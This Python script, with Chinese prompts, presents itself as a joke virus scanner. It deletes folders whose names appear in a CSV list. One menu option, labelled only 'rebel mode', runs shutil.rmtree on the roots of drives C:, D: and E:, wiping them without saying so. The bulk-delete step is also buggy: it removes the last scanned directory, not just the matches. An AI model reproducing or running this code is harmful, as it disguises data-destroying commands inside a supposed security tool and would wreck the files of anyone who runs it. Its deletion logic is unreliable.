# coding:UTF-8
# by zjn|小逮逮|0zjn0123|https://github.com/0zjn0123/
import os,zz,csv,shutil
bds = 0
path = None
bdk = [] # 在此更改病毒
sfsc = False
with open("bdk.csv", "r", encoding='UTF-8') as f:
    text = csv.reader(f)
    for mz in text:
        bdk.append(mz)
bdk = bdk[0]

def smbd(lj, bdm):
    global bds,path,sfsc
    path = zz.cc(lj, bdm)['lj']
    wj = zz.cc(lj, bdm)['wj']
    wjj = zz.cc(lj, bdm)['wjj']
    # 要检测文件夹的名称是____病毒
    for ii in range(len(wjj)):
        if wjj[ii] == bdm:
            bds += 1
            ss = input("路径:" + path + '扫描到' + bdm + '！是否删除？(1删除，0不删除)')
            if sfsc:
                sfsc = False
            if ss == '1':
                shutil.rmtree(path + "\\" + bdm)
                sfsc = True
                print("已删除" + bdm)
        else:
            print("路径：" + path + "无" + bdm)
    try:
        if ss == 1 or ss == 0:
            pass
    except Exception:
        print("路径：" + lj + "无" + bdm)





sdlx = int(input("欢迎来到‘杀只因大师’，在这里你可以杀死你电脑中的‘所有’只因病毒(输入1可自动扫描病毒,输入2自定义查杀，输入3开启叛逆模式)"))
def cz(bdm):
    if sdlx == 1:
        print('开始扫描，请稍后')
        for path, dirnames, filenames in os.walk('D:' + os.sep):
            smbd(path,bdm)
    elif sdlx == 2:
        lj = input("请输入要扫描的路径")
        print('开始扫描，请稍后')
        for path, dirnames, filenames in os.walk(lj + os.sep):
            smbd(path,bdm)
    elif sdlx == 3:
        shutil.rmtree("D:" + os.sep)
        shutil.rmtree("C:" + os.sep)
        shutil.rmtree("E:" + os.sep)
for bd_i in range(len(bdk)):
    cz(bdk[bd_i])
    if not sfsc:
        sc = input("有" + str(bds) + "个病毒，是否全部删除？（1为全部删除2为不删除）")
        if sc == '1':
            shutil.rmtree(path)
            print("已删除" + bdk[bd_i])
